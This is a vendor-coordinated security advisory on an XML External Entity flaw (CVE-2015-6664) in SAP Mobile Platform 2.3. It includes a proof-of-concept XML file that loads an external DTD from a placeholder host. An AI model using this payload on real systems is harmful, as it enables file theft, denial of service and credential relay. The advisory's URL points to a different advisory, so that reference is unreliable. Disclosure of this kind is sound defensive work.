Versions Affected: SAP Mobile Platform 2.3, probably others
Vendor URL: http://SAP.com
Bugs: XML External Entity
Send:                           25.02.2015
Reported: 25.02.2015
Vendor response: 25.02.2015
Date of Public Advisory: 11.08.2015
Reference: SAP Security Note 2152227
Author:        Vahagn Vardanyan (ERPScan)



Description


1. ADVISORY INFORMATION
Title: SAP Mobile Platform 2.3
Advisory ID: [ERPSCAN-15-020]
Risk: Hight
Advisory URL: http://erpscan.com/advisories/erpscan-14-020-sap-netweaver-management-console-gsaop-partial-http-requests-dos/
Date published: 11.08.2015
Vendors contacted: SAP

2. VULNERABILITY INFORMATION
Class: XML External Entity [CWE-611]
Impact: information disclosure, denial of service
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2015-6664
CVSS Information
CVSS Base Score:  4.9 / 10
CVSS Base Vector:
AV : Access Vector (Related exploit range) Network (N)
AC : Access Complexity (Required attack complexity) Medium (M)
Au : Authentication (Level of authentication needed to exploit) Single (S)
C : Impact to Confidentiality Partial (P)
I  : Impact to Integrity None (N)
A : Impact to Availability Partial (P)



3. VULNERABILITY DESCRIPTION
1) An attacker can read an arbitrary file on the server by sending a
correct XML request with a crafted DTD to read the reply from the
service.
2) An attacker can perform a DoS attack (for example, an XML Entity
expansion attack).
3) An SMB Relay attack is a type of Man-in-the-Middle attack where an
attacker asks a victim to authenticate into a machine controlled by
the attacker, then relays the credentials to the target. The attacker
forwards the authentication information both ways and gets access.



4. VULNERABLE PACKAGES
SAP Mobile Platform 2.3
Other versions are probably affected too, but they were not checked.

5. SOLUTIONS AND WORKAROUNDS
To correct this vulnerability, install SAP Security Note 2152227


6. AUTHOR
Vahagn Vardanyan (ERPScan)


7. TECHNICAL DESCRIPTION
The vulnerability affects the functionality used by an administrator
to import applications.
An attacker can replace ApplicationDefinition.xml file with a
malicious XML code.


PoC

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip_address">
%remote;]>
<applicationDefinition
xmlns="http://www.sybase.com/sup/applicationDefinition" id="SMP01"
type="ObjectAPI" enabled="true" displayName="SMP01">
    <description>Default application ID</description>
    <domains>
    <root/>
        <domain name="default">
            <packages>
                <package name="smp01:1.0" internalName="d1_smp01.1_0"/>
            </packages>
        </domain>
    </domains>
    <customizationResourceBundles/>
    <templates>
        <template name="SMP01_admin"/>
    </templates>
    <pushConfigs/>
    <hybridApps/>
</applicationDefinition>



8. REPORT TIMELINE
Send:                           25.02.2015
Reported: 25.02.2015
Vendor response: 25.02.2015
Date of Public Advisory: 11.08.2015

